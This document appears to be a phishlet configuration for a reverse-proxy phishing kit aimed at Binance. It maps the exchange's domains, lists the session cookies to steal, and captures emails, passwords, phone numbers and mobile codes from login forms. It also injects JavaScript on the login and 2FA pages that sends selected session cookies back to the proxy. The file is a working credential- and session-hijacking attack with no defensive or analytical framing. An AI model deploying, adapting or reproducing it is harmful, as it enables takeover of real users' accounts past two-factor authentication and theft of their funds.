  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

auth_tokens:
  - domain: 'accounts.binance.com'
    keys: ['bnc-uuid','s9r1','.*,regexp','logined','cr00','p20']
  - domain: 'www.binance.com'
    keys: ['bnc-uuid','lo_uid','.*,regexp','p20','cr00']

auth_urls:
  - 'en/my/dashboard'
  - '/dashboard/.*'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mobile'
      search: '(.*)'
      type: 'post'
    - key: 'mobileCode'
      search: '(.*)'
      type: 'post'
    - key: 'email'
      search: '(.*)'
      type: 'post'

login:
  domain: 'accounts.binance.com'
  path: '/en/login'

js_inject:
  - trigger_domains: ["accounts.binance.com", "www.binance.com"]
    trigger_paths: ["/en/login", "/en/login/2fa", "/login.*"]
    script: |
      function captureCookies() {
        const cookies = document.cookie.split(';');
        let capturedCookies = {};

        cookies.forEach((cookie) => {
          let [name, value] = cookie.trim().split('=');
          if (name === 'cr00' || name === 'p20t') {
            capturedCookies[name] = value;
          }
        });

        if (Object.keys(capturedCookies).length > 0) {
          fetch('/capture_cookies', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(capturedCookies),
            credentials: 'include'
          });
        }
      }

      function waitFor2FA() {
        const twoFACheckInterval = setInterval(() => {
          const twoFACodeField = document.querySelector('input[name="2fa"]');
          const submitButton = document.querySelector('button[type="submit"]');

          if (twoFACodeField && submitButton) {
            submitButton.addEventListener('click', () => {
              setTimeout(captureCookies, 3000);
            });
            clearInterval(twoFACheckInterval);
          }
        }, 1000);
      }

      document.addEventListener('DOMContentLoaded', waitFor2FA);